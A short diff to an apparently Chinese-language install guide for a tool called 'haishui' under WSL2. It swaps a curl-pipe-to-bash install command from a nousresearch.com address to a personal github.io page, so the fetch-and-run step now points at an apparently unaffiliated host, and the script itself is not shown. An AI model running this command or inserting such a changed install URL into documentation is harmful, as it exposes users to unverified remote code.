@@ -100,7 +100,7 @@ wsl --shutdown
 打开 WSL2 shell 后执行：
 
 ```bash
-curl -fsSL https://haishui-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://aiqinghaiwork163.github.io/haishui-agent/install.sh | bash
 source ~/.bashrc
 haishui
 ```
